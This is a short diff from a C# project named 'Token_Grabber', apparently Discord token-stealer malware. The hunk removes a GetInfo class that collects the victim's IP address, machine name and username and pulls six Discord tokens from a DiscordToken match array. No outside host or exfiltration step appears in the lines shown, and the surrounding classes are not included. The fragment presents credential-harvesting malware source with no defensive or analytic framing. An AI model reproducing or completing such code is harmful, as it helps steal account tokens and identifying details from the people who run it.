@@ -59,18 +59,4 @@ namespace Token_Grabber
 
 
     }
-
-    public class GetInfo
-    {
-        public static string Ip = PrintAllInfo.GetIp();
-        public static string PCName = Environment.MachineName;
-        public static string Username = Environment.UserName;
-        public static string Token1 = DiscordToken.matchs[0];
-        public static string Token2 = DiscordToken.matchs[1];
-        public static string Token3 = DiscordToken.matchs[2];
-        public static string Token4 = DiscordToken.matchs[3];
-        public static string Token5 = DiscordToken.matchs[4];
-        public static string Token6 = DiscordToken.matchs[5];
-
-    }
 }
